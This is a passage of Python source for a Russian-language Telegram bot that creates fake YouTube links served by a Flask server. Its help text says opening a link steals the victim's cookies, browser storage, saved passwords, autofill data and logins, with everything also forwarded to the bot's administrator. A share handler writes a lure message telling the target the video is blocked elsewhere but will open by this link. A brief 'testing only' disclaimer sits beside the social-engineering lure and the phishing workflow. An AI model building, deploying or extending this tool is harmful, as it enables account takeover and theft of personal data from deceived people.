🎯 *ДЕТАЛЬНЫЙ ОТЧЕТ ПО УЧЕТНЫМ ЗАПИСЯМ*

📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
📅 Всего данных: {len(all_credentials)} записей

📊 *СТАТИСТИКА ПО СЕРВИСАМ:*
"""
            
            if account_analysis.get("service_stats"):
                sorted_services = sorted(account_analysis["service_stats"].items(), 
                                       key=lambda x: x[1], reverse=True)
                
                for service, count in sorted_services:
                    service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    message += f"• {service_name_ru}: `{count}` записей\n"
            
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data.startswith("data_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = formatter.format_sensitive_data_report(link)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data == "help":
        help_message = f"""
🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*

🎯 *Как использовать:*
1. Отправьте боту ссылку на YouTube
2. Получите сгенерированную ссылку
3. Отправьте её другу/цели
4. Когда человек перейдет - данные соберутся автоматически
5. Получите данные в этот чат
6. *Все полные данные также отправятся администратору*

🔐 *Что именно собирается:*
• Все cookies текущего сайта
• Cookies популярных соцсетей
• LocalStorage и SessionStorage
• Сохраненные в браузере пароли
• Данные автозаполнения форм
• Логины из полей ввода
• Данные из хранилищ браузера
• Информацию о устройстве
• *Определение сервисов*: Google, Facebook, ВКонтакте, Twitter, Instagram и др.

🌐 *Веб-сервер:*
• Адрес: {DOMAIN}
• Порт: {SERVER_PORT}
• URL формата: {DOMAIN}/watch?v=VIDEO_ID&id=LINK_ID

⏱️ *Время сбора:* ~3-20 секунд
🔒 *Безопасность:* Данные шифруются при передаче

⚠️ *Важные предупреждения:*
• Используйте только для тестирования
• Не используйте для незаконных целей
• Данные хранятся 24 часа
• Все полные данные отправляются администратору

🔧 *Команды:*
• /start - Начало работы
• /data [ID] - Просмотр данных
• /accounts [ID] - Анализ учетных записей
• /stats - Статистика системы
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
                f"🌐 *Сервер:* {DOMAIN}:{SERVER_PORT}\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            share_text = f"""
🎁 *ПРИВЕТ! СМОТРИ КРУТОЕ ВИДЕО!* 🎁

Я нашел супер интересное видео на YouTube!
Обязательно посмотри - там реально круто!

🔗 *Ссылка на видео:*
{phishing_url}

⚠️ *Внимание:* Видео может быть заблокировано в твоей стране, 
но по этой ссылке оно откроется точно!

Скорее переходи! 👆
"""
            await query.message.reply_text(
                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
                "Скопируйте и отправьте другу.",
                parse_mode=ParseMode.MARKDOWN
            )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ *Ошибка в боте:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

async def main():
    """Основная функция запуска"""
    # Создаем приложение Telegram
    global application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("data", show_data_command))
    application.add_handler(CommandHandler("accounts", accounts_command))
    
    # Обработчик YouTube ссылок
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик inline кнопок
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    # Создаем папку для скриншотов
    os.makedirs("screenshots", exist_ok=True)
    
    # Запускаем Flask сервер в отдельном потоке
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    print("=" * 60)
    print("🤖 YouTube Data Collector Bot запущен!")
    print(f"👑 Админ: {ADMIN_ID}")
    print(f"🌐 Веб-сервер: {DOMAIN}:{SERVER_PORT}")
    print("🚀 Функции бота:")
    print("   - Сбор cookies, паролей, логинов")
    print("   - Определение сервисов (Google, Facebook и др.)")
    print("   - Мгновенный сбор при загрузке страницы")
    print("=" * 60)
    print("💡 Как тестировать:")
    print(f"1. Бот будет работать как обычно в Telegram")
    print(f"2. Веб-сервер доступен по адресу: http://localhost:{SERVER_PORT}")
    print(f"3. Фишинговые ссылки будут вида: http://localhost:{SERVER_PORT}/watch?v=VIDEO_ID&id=LINK_ID")
    print("4. Откройте ссылку в браузере для тестирования сбора данных")
    print("5. Данные будут приходить в Telegram бота")
    print("=" * 60)
    print("⏳ Ожидание команд в Telegram...")
    print("🔧 Основные команды:")
    print("   /start - Начало работы")
    print("   /data [ID] - Просмотр данных")
    print("   /accounts [ID] - Анализ учетных записей")
    print("=" * 60)
    
    # Запускаем бота
    await application.run_polling(allowed_updates=Update.ALL_UPDATES)

if __name__ == '__main__':
    # Запускаем асинхронную основную функцию
    asyncio.run(main())